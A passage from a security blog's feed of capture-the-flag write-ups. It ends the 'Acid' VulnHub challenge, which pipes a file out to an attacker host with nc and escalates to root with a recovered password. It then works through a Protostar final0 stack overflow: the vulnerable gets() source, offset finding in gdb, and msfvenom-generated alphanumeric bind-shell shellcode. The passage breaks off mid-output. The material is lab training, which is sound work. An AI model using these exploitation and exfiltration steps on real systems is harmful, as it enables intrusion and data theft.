</span><span class='line'>/home/acid/.xsession-errors
</span><span class='line'>/home/acid/.dmrc
</span><span class='line'>/home/acid/.Xauthority
</span><span class='line'>/home/acid/.local
</span><span class='line'>/home/acid/.local/share
</span><span class='line'>/home/acid/.xscreensaver
</span><span class='line'>/home/acid/.bash_history
</span><span class='line'>/home/acid/.bash_logout</span></code></pre></td></tr></table></div></figure></p>

<p>The first file was suspicious, after copying to our server and simple analysis we found the following:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nc -l -p 1399 > dump&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>www-data@acid:/$ base64 /sbin/raw_vs_isi/hint.pcapng | nc 192.168.80.137 1399&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# base64 -d dump > capfile&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:/var/www# tcpick -C -yU -r capfile | less -R
</span><span class='line'>&hellip;
</span><span class='line'>What was the name of the Culprit ???
</span><span class='line'>saman and now a days he&rsquo;s known by the alias of 1337hax0r
</span><span class='line'>oh&hellip;Fuck&hellip;.Great&hellip;Now, we gonna Catch Him Soon :D
</span><span class='line'>&hellip;</span></code></pre></td></tr></table></div></figure></p>

<p>Finally, we use the string <code>1337hax0r</code> as password:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@acid:/home/acid$ su saman&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Password: 1337hax0r&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>saman@acid:/home/acid$ sudo su&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[sudo] password for saman: 1337hax0r&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;p> / &lt;strong>&lt;em>|&lt;/em>&lt;/strong>  _ &lt;strong>   &lt;/strong> _ _ &lt;strong> &lt;/strong> &lt;em>| |&lt;/em> _   &lt;em>| | __ &lt;/em>| |&lt;em>(&lt;/em>) &lt;em>&lt;strong>  _ &lt;/strong>  &lt;/em>&lt;strong>
</span><span class='line'>| |   / _ | &lsquo;&lt;em> \ / &lt;/em>&lt;code>| '__/ _&lt;/code> | &lt;/strong>| | | | |/ &lt;em>` | __| |/ _ | &rsquo;&lt;/em> \/ &lt;strong>|
</span><span class='line'>| |&lt;/strong>| (&lt;em>) | | | | (&lt;/em>| | | | (&lt;em>| | |&lt;/em>| |&lt;em>| | | (&lt;/em>| | |&lt;em>| | (&lt;/em>) | | | _&lt;em> \
</span><span class='line'> _&lt;/em>&lt;strong>_&lt;/strong>/|&lt;em>| |&lt;/em>|_&lt;em>, |&lt;/em>|  _&lt;em>,&lt;/em>|_&lt;em>|_&lt;/em>,&lt;em>|&lt;/em>|_&lt;em>,&lt;/em>|_&lt;em>|&lt;/em>|_&lt;strong>/|&lt;em>| |&lt;/em>|&lt;/strong>&lt;em>/
</span><span class='line'>                  |&lt;/em>__/&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@acid:~# cat flag.txt&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Dear Hax0r,&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>You have successfully completed the challenge.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>I  hope you like it.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>FLAG NAME: &ldquo;Acid@Makke@Hax0r&rdquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Kind &amp; Best Regards&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>-ACID
</span><span class='line'>facebook: &lt;a href="https://facebook.com/m.avinash143">https://facebook.com/m.avinash143&lt;/a></span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Final Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/07/06/exploit-exercises-protostar-final-levels/"/>
    <updated>2015-07-06T08:14:11+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/07/06/exploit-exercises-protostar-final-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ wget &lt;a href="https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt">https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt&lt;/a> &ndash;no-check-certificate -O ~/.gdbinit -q</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Final0</h2>

<p><figure class='code'><figcaption><span>final0.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;..</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">common</span><span class="p">.</span><span class="n">c</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">NAME</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">final0</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">UID</span> <span class="mi">0</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">GID</span> <span class="mi">0</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">PORT</span> <span class="mi">2995</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;/&lt;</span><span class="n">em</span><span class="o">&gt;</span>
</span><span class='line'> <span class="o">*</span> <span class="n">Read</span> <span class="n">the</span> <span class="n">username</span> <span class="n">in</span> <span class="n">from</span> <span class="n">the</span> <span class="n">network</span>
</span><span class='line'> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">get_username</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">q</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Strip</span> <span class="n">off</span> <span class="n">trailing</span> <span class="n">new</span> <span class="n">line</span> <span class="n">characters</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="err">\</span><span class="n">r</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Convert</span> <span class="n">to</span> <span class="n">lower</span> <span class="k">case</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">toupper</span><span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Duplicate</span> <span class="n">the</span> <span class="n">string</span> <span class="n">and</span> <span class="k">return</span> <span class="n">it</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Run</span> <span class="n">the</span> <span class="n">process</span> <span class="n">as</span> <span class="n">a</span> <span class="n">daemon</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Wait</span> <span class="k">for</span> <span class="n">socket</span> <span class="n">activity</span> <span class="n">and</span> <span class="k">return</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Set</span> <span class="n">the</span> <span class="n">client</span> <span class="n">socket</span> <span class="n">to</span> <span class="n">STDIN</span><span class="p">,</span> <span class="n">STDOUT</span><span class="p">,</span> <span class="n">and</span> <span class="n">STDERR</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">username</span> <span class="o">=</span> <span class="n">get_username</span><span class="p">();</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">No</span> <span class="n">such</span> <span class="n">user</span> <span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">username</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We attach to the process as root to find the offset with stored EIP.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window1:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>root@protostar:/tmp# gdb -q -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set detach-on-fork off&rsquo; -x /home/user/.gdbinit -p 27474
</span><span class='line'>Attaching to process 27474
</span><span class='line'>&hellip;
</span><span class='line'>gdb> c
</span><span class='line'>[New process 27485]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window2:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/tmp$ echo &ldquo;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2A&rdquo; | nc 0 2995&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window1:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[Switching to process 27485]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code> eax:0804B008 ebx:35724134  ecx:00000000  edx:00000001     eflags:00010286
</span><span class='line'> esi:00000000 edi:00000000  esp:BFFFF780  ebp:41367241     eip:72413772
</span><span class='line'> cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z a P c 
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>[007B:BFFFF780]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
</span><span class='line'>BFFFF7B0 : 01 00 00 00  54 F8 FF BF - 5C F8 FF BF  48 18 FE B7 &hellip;.T&hellip;...H&hellip;
</span><span class='line'>BFFFF7A0 : B0 98 04 08  00 00 00 00 - 28 F8 FF BF  76 DC EA B7 &hellip;&hellip;..(&hellip;v&hellip;
</span><span class='line'>BFFFF790 : 65 63 EC B7  40 10 FF B7 - 04 00 00 00  F4 7F FD B7 ec..@&hellip;&hellip;&hellip;..
</span><span class='line'>BFFFF780 : 38 41 72 39  41 73 30 41 - 73 31 41 73  32 41 00 BF 8Ar9As0As1As2A..
</span><span class='line'>[007B:0804B008]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
</span><span class='line'>0804B008 : 41 41 30 41  41 31 41 41 - 32 41 41 33  41 41 34 41 AA0AA1AA2AA3AA4A
</span><span class='line'>0804B018 : 41 35 41 41  36 41 41 37 - 41 41 38 41  41 39 41 42 A5AA6AA7AA8AA9AB
</span><span class='line'>[0073:72413772]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ code]
</span><span class='line'>0x72413772: Error while running hook_stop:
</span><span class='line'>Cannot access memory at address 0x72413772
</span><span class='line'>0x72413772 in ?? ()&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window2:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x72413772
</span><span class='line'>[*] Exact match at offset 532&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window1:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> i r
</span><span class='line'>eax            0x804b008    0x804b008
</span><span class='line'>ecx            0x0  0x0
</span><span class='line'>edx            0x1  0x1
</span><span class='line'>ebx            0x35724134   0x35724134
</span><span class='line'>esp            0xbffff780   0xbffff780
</span><span class='line'>ebp            0x41367241   0x41367241
</span><span class='line'>esi            0x0  0x0
</span><span class='line'>edi            0x0  0x0
</span><span class='line'>eip            0x72413772   0x72413772
</span><span class='line'>eflags         0x10286  [ PF SF IF RF ]
</span><span class='line'>cs             0x73 0x73
</span><span class='line'>ss             0x7b 0x7b
</span><span class='line'>ds             0x7b 0x7b
</span><span class='line'>es             0x7b 0x7b
</span><span class='line'>fs             0x0  0x0
</span><span class='line'>gs             0x33 0x33&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> x /x 0x804b008
</span><span class='line'>0x804b008:  0x41304141
</span><span class='line'>gdb> x /s 0x804b008
</span><span class='line'>0x804b008:   &ldquo;AA0AA1AA2AA3AA4AA5AA6AA7AA8AA9AB0AB1AB2AB3AB4AB5AB6AB7AB8AB9AC0AC1AC2AC3AC4AC5AC6AC7AC8AC9AD0AD1AD2AD3AD4AD5AD6AD7AD8AD9AE0AE1AE2AE3AE4AE5AE6AE7AE8AE9AF0AF1AF2AF3AF4AF5AF6AF7AF8AF9AG0AG1AG2AG3AG4AG5AG&rdquo;&hellip;</span></code></pre></td></tr></table></div></figure></p>

<p>So EAX points at the beginning to the buffer and we are lucky, because there is also <code>call eax</code> in binary.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/msfelfscan -j eax final0
</span><span class='line'>[final0]
</span><span class='line'>0x08048d5f call eax
</span><span class='line'>0x0804992b call eax
</span><span class='line'>0x08054f4b call eax
</span><span class='line'>0x08054f4b call eax</span></code></pre></td></tr></table></div></figure></p>

<p>We use <code>msfvenom</code> to generate bind shell, port <code>2449</code>, without newline characters and with uppercase encoding:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2449 -e x86/alpha_upper -b &lsquo;\x0a\x0d&rsquo;
</span><span class='line'>No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span><span class='line'>No Arch selected, selecting Arch: x86 from the payload
</span><span class='line'>Found 1 compatible encoders
</span><span class='line'>Attempting to encode payload with 1 iterations of x86/alpha_upper
</span><span class='line'>x86/alpha_upper succeeded with size 224 (iteration=0)
</span><span class='line'>Payload size: 224 bytes
</span><span class='line'>???t$?[SYIIICCCCCCCQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIFQYKL7JCQCQS1CSZTBK9KQNPCV8MK01K1N1B3XC2C0C9LQ2J4PF160K9KQCZ560X8MK0K91QTDH3DDX02F8MK0PC80RFHMMPZ3V9RJWOV8HMK0PIT9KHCX6OVOT3RHRHVOCRU9BNMYM30PPSLIKQNPDKXMK0AA</span></code></pre></td></tr></table></div></figure></p>

<p>The lower case <code>t</code> at the beginning of the payload is used in order to find the payload&rsquo;s absolute location in memory and obtain a position-independent shellcode,
more <a href="https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/">here</a>.</p>

<p>Because we can refer to this position also with the register <code>eax</code>, we can get rid of lower case character:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2449 -e x86/alpha_upper -b &lsquo;\x0a\x0d&rsquo; BufferRegister=EAX
</span><span class='line'>No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span><span class='line'>No Arch selected, selecting Arch: x86 from the payload
</span><span class='line'>Found 1 compatible encoders
</span><span class='line'>Attempting to encode payload with 1 iterations of x86/alpha_upper
</span><span class='line'>x86/alpha_upper succeeded with size 217 (iteration=0)
</span><span class='line'>Payload size: 217 bytes
